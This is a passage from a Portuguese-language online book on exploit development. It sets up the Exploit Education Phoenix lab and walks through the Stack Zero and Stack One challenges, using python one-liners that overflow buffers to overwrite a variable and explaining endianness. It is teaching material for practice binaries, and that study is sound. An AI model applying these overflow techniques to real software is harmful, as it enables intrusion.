<!DOCTYPE HTML>
<html lang="pt-br" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Um Livrinho Sobre Exploit Dev</title>
        <meta name="robots" content="noindex" />
        <!-- Custom HTML head -->
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="mapa.html">Mapa</a></li><li class="spacer"></li><li class="chapter-item "><a href="stack/stack.html">Stack</a></li><li class="chapter-item "><a href="stack/phoenix/setup.html">Phoenix Stack</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/phoenix/StackZero.html">Stack Zero</a></li><li class="chapter-item "><a href="stack/phoenix/StackOne.html">Stack One</a></li><li class="chapter-item "><a href="stack/phoenix/StackTwo.html">Stack Two</a></li><li class="chapter-item "><a href="stack/phoenix/StackThree.html">Stack Three</a></li><li class="chapter-item "><a href="stack/phoenix/StackFour.html">Stack Four</a></li><li class="chapter-item "><a href="stack/phoenix/StackFive.html">Stack Five</a></li><li class="chapter-item "><a href="stack/phoenix/StackSix.html">Stack Six</a></li></ol></li><li class="chapter-item "><a href="stack/mitigacoes.html">Mitiga√ß√µes</a></li><li class="chapter-item "><a href="stack/ret2libc.html">Ret2LibC</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six</div></li><li class="chapter-item "><div>Avan√ßado: M√∫ltiplos ret2libc</div></li></ol></li><li class="chapter-item "><a href="stack/gotplt.html">GOT e PLT</a></li><li class="chapter-item "><a href="stack/rop/intro.html">ROP</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/rop/primitivos.html">Primitivos</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/rop/ROPE/dump.html">ROPE</a></li></ol></li><li class="chapter-item "><div>Pivot</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/rop/ROPE/pivot.html">ROPE: pivot</a></li></ol></li><li class="chapter-item "><a href="stack/rop/SROP/SROP.html">SROP</a></li><li class="chapter-item "><a href="stack/rop/ret2dlresolve.html">ret2dl-resolve</a></li></ol></li><li class="chapter-item "><a href="stack/ASLR/aslr.html">ASLR</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="stack/ASLR/corromperGOT.html">Corromper GOT</a></li><li class="chapter-item "><a href="stack/ASLR/ret2plt.html">ret2plt</a></li><li class="chapter-item "><a href="stack/ASLR/brute32.html">Bruteforce</a></li></ol></li><li class="chapter-item "><div>Canary</div></li><li class="chapter-item "><div>PIE</div></li><li class="chapter-item "><a href="stack/leakAll.html">Extra: Leakando tudo</a></li><li class="spacer"></li><li class="chapter-item "><a href="heap/heap.html">Heap</a></li><li class="chapter-item "><a href="heap/intro.html">Intro</a></li><li class="chapter-item "><div>Bugs Gerais</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>UAF</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="heap/geral/uaf/heap-two.html">Exploit Education: Heap Two</a></li></ol></li></ol></li><li class="chapter-item "><a href="heap/relacionados/relacionados.html">Conceitos Relacionados</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="heap/relacionados/io_list_all.html">_IO_list_all</a></li></ol></li><li class="chapter-item "><a href="heap/malloc/intro.html">Atacando Malloc</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="heap/malloc/teoria.html">Teoria</a></li><li class="chapter-item "><a href="heap/malloc/fastbinsDup.html">Fastbins Dup</a></li><li class="chapter-item "><a href="heap/malloc/HouseOfForce.html">House of Force</a></li><li class="chapter-item "><a href="heap/malloc/HouseOfSpirit.html">House of Spirit</a></li><li class="chapter-item "><a href="heap/malloc/unsafeUnlink.html">Unsafe Unlink</a></li><li class="chapter-item "><a href="heap/malloc/safeUnlink.html">Safe Unlink</a></li><li class="chapter-item "><a href="heap/malloc/HouseOfEinherjar.html">House of Einherjar</a></li><li class="chapter-item "><a href="heap/malloc/GooglePoisonNull.html">Google Poison Null Byte</a></li><li class="chapter-item "><a href="heap/malloc/PartialUnlink.html">Unsorted bins: Partial Unlink</a></li><li class="chapter-item "><a href="heap/malloc/HouseOfOrange.html">House of Orange</a></li><li class="chapter-item "><a href="heap/malloc/HouseOfLore.html">House of Lore</a></li><li class="chapter-item "><div>House of Rust</div></li><li class="chapter-item "><div>House of Corrosion</div></li></ol></li><li class="chapter-item "><div>Extra</div></li><li class="spacer"></li><li class="chapter-item "><a href="linux_internals/linux.html">Linux Internals</a></li><li class="chapter-item "><a href="linux_internals/prerequisitos.html">Prerequisitos</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="mapa"><a class="header" href="#mapa">Mapa</a></h1>
<p>Isso nao ta pronto aaaaaaa foi mal :(</p>
<h2 id="stack"><a class="header" href="#stack">Stack</a></h2>
<pre><code>Phoenix Stack:
BoF Tradicional, Assembly,... etc
     |__________ _______________ ____
     |          |               |    |        
     V          V               |    V
    W^X     GOT e PLT           | Canary
     |          |_________      V    |                 
     |          |         |    PIE   |
     V          V         V     |    |
  Ret2libC     ASLR     RELRO   |    |
     |          |               |    |
     |          V__ ____________V_ __V        
     |             |              |
     V             V              V
    ROP           Leak          Brute     
 ____|____     
|         |   
V         V   
SROP   ret2dl_resolve 
</code></pre>
<h2 id="fuzz-todo"><a class="header" href="#fuzz-todo">Fuzz ~TODO~</a></h2>
<pre><code></code></pre>
<h2 id="heap-todo"><a class="header" href="#heap-todo">Heap ~TODO~</a></h2>
<pre><code></code></pre>
<h2 id="linux-internals-todo"><a class="header" href="#linux-internals-todo">Linux Internals ~TODO~</a></h2>
<pre><code></code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="stack-1"><a class="header" href="#stack-1">Stack</a></h1>
<p>Nesse capitulo vamos aprender sobre:</p>
<ul>
<li>Introdu√ß√£o a Assembly e conceitos relacionados!</li>
<li>Buffer Overflow Cl√°ssico</li>
<li>Mitiga√ß√µes comuns e como derrota-las:
<ul>
<li>W^X</li>
<li>ASLR</li>
<li>Canary</li>
<li>PIE</li>
<li>RELRO</li>
</ul>
</li>
<li>ROP Avan√ßado </li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><p>Se encontrar algum erro, abre uma issue pf :)</p>
<p><strong>Link pros desafios: <a href="https://exploit.education/phoenix/">Exploit Education Phoenix</a></strong> </p>
<p>Inspiracao (ingles):</p>
<p><a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-zero-solution/">lamarranet</a></p>
<p><a href="https://youtu.be/Y-4WHf0of6Y">Live Overflow (Mas √© sobre o antigo: Protostar)</a></p>
<h1 id="-prerequisitos"><a class="header" href="#-prerequisitos">üñ•Ô∏è Prerequisitos:</a></h1>
<ul>
<li>Saber alguma linguagem de programa√ß√£o e conceitos relacionados</li>
</ul>
<h1 id="-opcional-mas-util-saber"><a class="header" href="#-opcional-mas-util-saber">üêß Opcional mas util saber</a></h1>
<ul>
<li>üíæ Um pouco de C / C++ / Rust / Linguagem de n√≠vel baixo</li>
<li>üêç Alguma linguagem de scripting: Python, Ruby, .....</li>
<li>üêß Saber o b√°sico de Linux</li>
</ul>
<h1 id="-setup"><a class="header" href="#-setup">ü§ñ Setup:</a></h1>
<ul>
<li>Baixar kali linux usando VM-Ware ou Virtual Box</li>
<li>Baixar Qemu na VM: <code>sudo apt-get install qemu</code></li>
<li>Baixar a imagem QCOW2 (eu usei AMD64): <a href="https://exploit.education/downloads/">Downloads Exploit Education</a></li>
<li>Na maquina kali executar:</li>
</ul>
<pre><code class="language-bash">$ cd ~/Downloads/exploit-education-phoenix-amd64
$ chmod +x boot-exploit-education-phoenix-amd64.sh
$ ./boot-exploit-education-phoenix-amd64.sh
</code></pre>
<ul>
<li><strong>N√ÇO USAR O CONSOLE BUGADO QUE APARECE !!!</strong> Minimiza e esquece que ele existe!</li>
<li>Usa: ssh -p 2222 user@localhost # Os usu√°rios/senha s√£o: user/user e root/root</li>
<li>Os arquivos t√£o em: cd /opt/phoenix/amd64</li>
</ul>
<p>Boa Sorte! :D</p>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackZero.html#-descri%C3%A7%C3%A3o">üìù Descri√ß√£o</a></li>
<li><a href="stack/phoenix/StackZero.html#-dica">üí° Dica</a></li>
<li><a href="stack/phoenix/StackZero.html#conhecimento-preliminar">Conhecimento Preliminar</a>
<ul>
<li><a href="stack/phoenix/StackZero.html#buffer">Buffer</a></li>
<li><a href="stack/phoenix/StackZero.html#stack">Stack</a>
<ul>
<li><a href="stack/phoenix/StackZero.html#a-stack-cresce-para-valores-menores">A stack cresce para valores menores</a></li>
<li><a href="stack/phoenix/StackZero.html#hex">Hex</a></li>
<li><a href="stack/phoenix/StackZero.html#melhorando-o-exemplo-do-po%C3%A7o">Melhorando o exemplo do po√ßo</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackZero.html#-explica%C3%A7%C3%A3o">üéâ Explica√ß√£o</a>
<ul>
<li><a href="stack/phoenix/StackZero.html#-1--alocando-as-vari%C3%A1veis-na-stack-buffer64-changeme">ü•û 1- Alocando as vari√°veis na stack (buffer[64], changeme)</a></li>
<li><a href="stack/phoenix/StackZero.html#-2--alterar-buffer64-usando-gets">üí• 2- Alterar buffer[64] usando gets</a></li>
<li><a href="stack/phoenix/StackZero.html#-3--o-programa-checa-se-changeme-foi-alterada">‚úÖ 3- O programa checa se changeme foi alterada</a>
<ul>
<li><a href="stack/phoenix/StackZero.html#-64-as-changeme-n%C3%A3o-alterado">‚ùå 64 As, changeme n√£o alterado</a></li>
<li><a href="stack/phoenix/StackZero.html#-65-as-changeme-alterado">‚úÖ 65 As, changeme alterado</a></li>
<li><a href="stack/phoenix/StackZero.html#%EF%B8%8F-64-as-e-um-b-0x42-aaaaaaaaaaaab">üÖ±Ô∏è 64 As e um B (0x42): AAAAAAAAA.....AAAB</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackZero.html#-solu%C3%A7%C3%A3o">üëæ Solu√ß√£o</a></li>
</ul>
<h1 id="-descri√ß√£o"><a class="header" href="#-descri√ß√£o">üìù Descri√ß√£o</a></h1>
<p>Esse n√≠vel demonstra que memoria pode ser acessada fora da sua regi√£o 
inicialmente alocada, como as vari√°veis s√£o alocadas na stack, e que altera-las pode mudar a execu√ß√£o do programa.</p>
<p>Objetivo: Alterar a vari√°vel &quot;changeme&quot;</p>
<h1 id="-dica"><a class="header" href="#-dica">üí° Dica</a></h1>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 10)&quot;
AAAAAAAAAA

$ python3 -c &quot;print('A' * 10)&quot; | ./stack-zero 
</code></pre>
<h1 id="conhecimento-preliminar"><a class="header" href="#conhecimento-preliminar">Conhecimento Preliminar</a></h1>
<h2 id="buffer"><a class="header" href="#buffer">Buffer</a></h2>
<p>Buffers s√£o similares a arrays em outras linguagens de programa√ß√£o,
mas possuem tamanho fixo!</p>
<p>Eles s√£o definidos usando: <code>tipo nome[tamanho]</code> </p>
<p>O <code>tipo</code>, √© do que esta sendo armazenado dentro, por exemplo:</p>
<pre><code class="language-C">char buf[64]; // Armazena 64 caracteres
int buf[32];  // Armazena 32 ints
</code></pre>
<p>Esses buffers por possu√≠rem tamanho fixo, s√£o armazenados na stack!</p>
<h2 id="stack-2"><a class="header" href="#stack-2">Stack</a></h2>
<p>A stack √© uma por√ß√£o da memoria que armazena como se fosse uma pilha de pratos:</p>
<pre><code>Quando voc√™ quer colocar um novo, voc√™ coloca no topo da pilha (push)
Quando voc√™ quer pegar um da pilha, voc√™ pega o do topo (pop)

O ultimo a entrar, √© o primeiro a sair...
o nome desse comportamento √© LIFO (Last in First Out)
</code></pre>
<p><img src="stack/phoenix/./img/push-pop.png" alt="Imagem da wikipedia mostrando PUSH e POP" /></p>
<h3 id="a-stack-cresce-para-valores-menores"><a class="header" href="#a-stack-cresce-para-valores-menores">A stack cresce para valores menores</a></h3>
<pre><code>Imagina que ela √© um po√ßo que come√ßa na profundidade 15

Quando voc√™ coloca um objeto de tamanho 2 no po√ßo:
ele vai estar apoiado na profundidade 15, e vai at√© a profundidade 13

Em seguida, voc√™ coloca algo de tamanho 3:
vai estar apoiado na profundidade 13, e vai at√© a profundidade 10
</code></pre>
<p>Conforme voc√™ vai <strong>adicionando</strong> itens, o endere√ßo que eles est√£o vai <strong>diminuindo</strong> em valor.
√â meio confuso, mas com o tempo voc√™ pega o jeito.</p>
<p>Pra complicar um pouco mais, esses endere√ßos t√£o em hexadecimal (0x0 ate 0xF, o &quot;0x&quot; √© pra representar que o valor t√° em hex).</p>
<h3 id="hex"><a class="header" href="#hex">Hex</a></h3>
<p>Se vc n√£o souber hex: <a href="https://pt.wikipedia.org/wiki/Sistema_de_numera%C3%A7%C3%A3o_hexadecimal">Wikipedia Sistema de numera√ß√£o hexadecimal</a>
. Mas resumindo, em hex voc√™ conta:</p>
<pre><code>Hex: 0,1,2,...,8,9,A ,B ,C ,D ,E ,F ,10,11,12,...,19,1A,1B,1C,...,FF
Dec: 0,1,2,...,8,9,10,11,12,13,14,15,16,17,18,...,25,26,27,28,...,127
</code></pre>
<p>Ent√£o a base da stack √© 0xFFFFFFFF e o topo 0X00000000 !</p>
<h3 id="melhorando-o-exemplo-do-po√ßo"><a class="header" href="#melhorando-o-exemplo-do-po√ßo">Melhorando o exemplo do po√ßo</a></h3>
<pre><code>0x0- 	     Topo da stack/Topo do po√ßo
0xA ate 0x1- espa√ßo vazio
0xD-         Segundo item
0xF-         Base da stack/Fundo do po√ßo, primeiro item
</code></pre>
<h1 id="-explica√ß√£o"><a class="header" href="#-explica√ß√£o">üéâ Explica√ß√£o</a></h1>
<p>A fun√ß√£o main() pode estar sendo divida em 3 Partes:</p>
<ol>
<li>ü•û Alocando as vari√°veis na stack (buffer[64], changeme)</li>
<li>üí• Alterar buffer[64] usando gets()</li>
<li>‚úÖ Checando se changeme foi alterada</li>
</ol>
<pre><code class="language-C">int main(int argc, char **argv) {
			// Definir vari√°veis locais
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf(&quot;%s\n&quot;, BANNER); // Printar o banner (todo n√≠vel faz isso)

  locals.changeme = 0;
  gets(locals.buffer);   // Alterar o buffer

  if (locals.changeme != 0) { 	// Checar se changeme foi alterada
    puts(&quot;Well done, the 'changeme' variable has been changed!&quot;);
  } else {
    puts(&quot;Uh oh, 'changeme' has not yet been changed&quot;);
  }

  exit(0);
}
</code></pre>
<p>Ue, <code>changeme</code> nunca foi alterada... Ela n√£o deveria estar mudando!</p>
<p>Calma que voc√™ ja vai entender :)</p>
<h2 id="-1--alocando-as-vari√°veis-na-stack-buffer64-changeme"><a class="header" href="#-1--alocando-as-vari√°veis-na-stack-buffer64-changeme">ü•û 1- Alocando as vari√°veis na stack (buffer[64], changeme)</a></h2>
<p>A vari√°vel <code>buffer[64]</code> tem  tamanho de 64 bytes (64 letras, assumindo ASCII, um byte por letra).</p>
<p>A vari√°vel <code>changeme</code> esta marcada como <code>vol√°til</code> para prevenir que o compilador
destrua ela (pq originalmente n√£o seria
alterada, ent√£o seria destru√≠da para otimizar o c√≥digo... 
Mas n√≥s vamos alterar ela por m√©todos... ~risada mal√©fica~ ... n√£o convencionais hehehe).</p>
<p>Nossas duas vari√°veis (buffer[64] e changeme) s√£o empurradas na stack.</p>
<pre><code>buffer[64] (preenchido com zeros (vazio))
changeme   (com o valor: 0x00)
ret        - Base dessa stack
</code></pre>
<h2 id="-2--alterar-buffer64-usando-gets"><a class="header" href="#-2--alterar-buffer64-usando-gets">üí• 2- Alterar buffer[64] usando gets</a></h2>
<p>A fun√ß√£o <code>gets()</code> abre um input no terminal, e escreve o que recebeu no <code>buffer</code>.</p>
<p>O problema √© que ela <strong>n√£o</strong> checa se o valor recebido √© maior que o <code>buffer</code>, permitindo que 
voc√™ <strong>escreva fora do buffer!!</strong> D:</p>
<p>Ela vai come√ßar a escrever no topo do buffer (menor endere√ßo)
e vai descendo at√© a base da stack.</p>
<pre><code>**Stack**
buffer
       [
A           | Gets escreve nesse sentido
A           |
A           \/
...
A
      ]
changeme (com valor 0x00)
ret       - Base dessa stack
</code></pre>
<p>Ent√£o, caso coloc√°ssemos 100 &quot;A&quot;s no buffer de tamanho 64, as vari√°veis nos pr√≥ximos 36 endere√ßos seriam alteradas.</p>
<p>Essas vari√°veis ficariam com o valor &quot;41&quot;, mas pq 41?</p>
<p>O valor ASCII do &quot;A&quot; √© 0x41, voc√™ pode checar o de todas letras usando:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Ui, o usu√°rio pode escrever fora memoria dele? perigoso ne! D:</p>
<p>√â por isso que essa fun√ß√£o est√° marcada como <em>Deprecated</em> (fora de uso).</p>
<p>No nosso caso, o buffer tem o tamanho de <strong>64</strong> bytes, se colocarmos <strong>65</strong> &quot;A&quot;s (65 bytes), o valor vai vazar desse buffer.
Isso quer dizer que antes a vari√°vel <code>changeme</code> tinha o valor <strong>0x00</strong> e agora tem o valor <strong>0x41</strong> !</p>
<pre><code>**Stack**
buffer
      [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
      ]
changeme (com o valor: 41)
ret       - Base dessa stack
</code></pre>
<h2 id="-3--o-programa-checa-se-changeme-foi-alterada"><a class="header" href="#-3--o-programa-checa-se-changeme-foi-alterada">‚úÖ 3- O programa checa se changeme foi alterada</a></h2>
<p>Se foi alterada, quer dizer que a gente <em>overflow-ou</em> (escreveu fora) do buffer, √© vitoria!!! :D</p>
<p>Ta, mas como a gente faz isso na pr√°tica?</p>
<p><code>python3 -c &quot;print(&quot;A&quot;*65)&quot;</code> printa 65 &quot;A&quot;s para o terminal</p>
<p>Ent√£o se a gente encaminhar esses &quot;A&quot;s pro programa....</p>
<pre><code>Se voc√™ quer tentar resolver sozinhe, agora √© a sua hora!

.
.
.
.
</code></pre>
<h3 id="-64-as-changeme-n√£o-alterado"><a class="header" href="#-64-as-changeme-n√£o-alterado">‚ùå 64 As, changeme n√£o alterado</a></h3>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 64)&quot; | ./stack-zero 
Banner
Uh oh, 'changeme' has not yet been changed.
Would you like to try again?
</code></pre>
<h3 id="-65-as-changeme-alterado"><a class="header" href="#-65-as-changeme-alterado">‚úÖ 65 As, changeme alterado</a></h3>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero 
Banner
Well done, the 'changeme' variable has been changed!
</code></pre>
<h3 id="üÖ±-64-as-e-um-b-0x42-aaaaaaaaaaaab"><a class="header" href="#üÖ±-64-as-e-um-b-0x42-aaaaaaaaaaaab">üÖ±Ô∏è 64 As e um B (0x42): AAAAAAAAA.....AAAB</a></h3>
<p>Para demonstrar melhor esse comportamento do buffer 
ser escrito em um sentido espec√≠fico (pq vai ser muito importante saber disso),
vou dar outro exemplo:
<code>python3 -c &quot;print('A' * 64 + 'B')&quot;</code> </p>
<pre><code class="language-md">buffer [
41           | Gets escreve nesse sentido
41           |
41           \/
...
41
       ]
changeme (com o valor: 42)   &lt;- B = 42!!!!
ret       - Base dessa stack
</code></pre>
<p>Os <code>A</code>s preenchem certinho a stack, e a gente pode colocar o valor que quiser na vari√°vel!! Uhhuuu :D</p>
<p>Esses As s√≥ pra encher a stack s√£o chamados de <code>padding</code> (traduz pra preenchimento).</p>
<hr />
<p>Fim! :D</p>
<p>Ouch... isso foi um bocado de explica√ß√£o, mas relaxa que daqui pra frente fica mais dif√≠cil hehehe :D</p>
<p>Se voc√™ chegou at√© aqui, voc√™ ta de parab√©ns !!!</p>
<p>Pra lembrar bem, desenha uma stack no papel, da um push nas vari√°veis e no buffer, mostra o sentido que o 
buffer escreve, e ele vazando e mudando o valor das outras vari√°veis...</p>
<h1 id="-solu√ß√£o"><a class="header" href="#-solu√ß√£o">üëæ Solu√ß√£o</a></h1>
<pre><code class="language-bash">$ python3 -c &quot;print('A' * 65)&quot; | ./stack-zero
Welcome to phoenix/stack-zero, brought to you 
by https://exploit.education
Well done, the 'changeme' variable has been changed!
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/phoenix/StackOne.html#-objetivo">üéØ Objetivo</a></li>
<li><a href="stack/phoenix/StackOne.html#-dicas">üí° Dicas</a></li>
<li><a href="stack/phoenix/StackOne.html#-explica%C3%A7%C3%A3o">üí´ Explica√ß√£o</a>
<ul>
<li><a href="stack/phoenix/StackOne.html#input">Input</a></li>
<li><a href="stack/phoenix/StackOne.html#endian">Endian</a>
<ul>
<li><a href="stack/phoenix/StackOne.html#-dica-usando-valores-hex-diretamente">üåô Dica: Usando valores hex diretamente</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/phoenix/StackOne.html#-solu%C3%A7%C3%A3o">üî• Solu√ß√£o</a></li>
</ul>
<h1 id="-objetivo"><a class="header" href="#-objetivo">üéØ Objetivo</a></h1>
<p>Agora o objetivo n√£o √© s√≥ alterar <code>changeme</code>, √© alterar para um valor especifico!</p>
<p>Lembra aquilo de controlar o valor depois do preenchimento (<code>padding</code>) ?</p>
<p>Pois √©, ele vai ser super util agora!</p>
<h1 id="-dicas"><a class="header" href="#-dicas">üí° Dicas</a></h1>
<p>Ver a representa√ß√£o hex de cada letra:</p>
<blockquote>
<p>$ man ascii</p>
</blockquote>
<p>Dar um Google sobre Endianess.</p>
<h1 id="-explica√ß√£o-1"><a class="header" href="#-explica√ß√£o-1">üí´ Explica√ß√£o</a></h1>
<p>Se lembra de que no tutorial passado a gente trocou <code>changeme</code> pra <strong>41</strong> e <strong>42</strong>?</p>
<p>O que ta acontecendo por tr√°s das cenas √© que as letras est√£o virando a sua representa√ß√£o hex.</p>
<p>Ent√£o <code>print(&quot;A&quot;*5)</code> √© equivalente √† <code>print(b&quot;\x41&quot;*5)</code></p>
<blockquote>
<p>Presta aten√ß√£o no b&quot;&quot; : esse b indica que s√£o Bytes! :D</p>
</blockquote>
<p>As vezes o python3 vai reclamar de voc√™ usar valores arbitr√°rios pra esses bytes,
ent√£o voc√™ pode usar o python2 (o print n√£o tem par√™nteses, mas o resto √© igual):</p>
<blockquote>
<p>$ python -c &quot;print 'blablabla'&quot;</p>
</blockquote>
<p>Nesse caso, changeme ta sendo comparada com <strong>0x496c5962</strong></p>
<pre><code class="language-C">  if (locals.changeme == 0x496c5962) {
    puts(&quot;Well done, you have successfully set changeme 
				to the correct value&quot;);
</code></pre>
<p>O buffer tem tamanho 64 de novo, ent√£o podemos usar 64 caracteres para preenche-lo, igual na anterior! uhuuuu :D</p>
<h2 id="input"><a class="header" href="#input">Input</a></h2>
<p>Nesse caso, o programa n√£o ta usando o gets pra abrir um input.</p>
<p>Ele ta usando o <code>argv</code> (o que vem depois do nome do programa quando
voc√™ executa no terminal)</p>
<blockquote>
<p>./stack-one teste batata</p>
</blockquote>
<pre><code>argv[0] = stack-one (o nome do programa)
argv[1] = teste
argv[2] = batata
... e assim por diante
</code></pre>
<blockquote>
<p>argc √© a contagem: quantas coisas tem no argv! E aqui t√° checando se √© menor que 2!</p>
</blockquote>
<p>ent√£o no nosso caso, para mandar o input do python para o argv vai funcionar assim:</p>
<blockquote>
<p>$ ./stack-one $(python -c &quot;print b'A' * 64&quot;)
o <code>$()</code> executa o comando dentro dos par√™nteses e usa o valor retornado como input do outro!</p>
</blockquote>
<p>ent√£o <code>$(python....)</code> vai executar, e em seguida:</p>
<blockquote>
<p>./stack-one AAAAAAAAAAAAAA...</p>
</blockquote>
<h2 id="endian"><a class="header" href="#endian">Endian</a></h2>
<p>O valor de changeme tem tamanho 4 bytes, pq ele √© um integer (integers s√£o 32 ou 64 bits, ent√£o 4 ou 8 bytes). Isso quer dizer que a gente pode colocar 4 letras :D</p>
<pre><code>./stack-one $(python -c &quot;print b'A' * 64 + 'BCDE'&quot;)
Welcome to phoenix/stack-one, brought to you by exploit.education
Getting closer! changeme is currently 0x45444342, we want 0x496c5962
</code></pre>
<p>O programa nos diz o valor de <code>changeme</code>, que nos alteramos por ter <strong>overflow-ado</strong> o buffer</p>
<p>Ue, que esquisito, vc reparou algo de estranho?</p>
<p>A gente mandou <code>BCDE (42 43 44 45)</code> e ele colocou <code>EDCB (45 44 43 42)</code>, por que isso?</p>
<p>Os computadores armazenam integers usando um sistema Little Endian (LE) ou Big Endian (BE), esses sistemas decidem como os n√∫meros s√£o representados.</p>
<blockquote>
<p>Esses sistemas se referem a magnitude dos d√≠gitos, Centena, Dezena, Unidade,...</p>
</blockquote>
<blockquote>
<p>Em um sistema BE, os numeros s√£o representados em ordem decrescente CDU.</p>
</blockquote>
<blockquote>
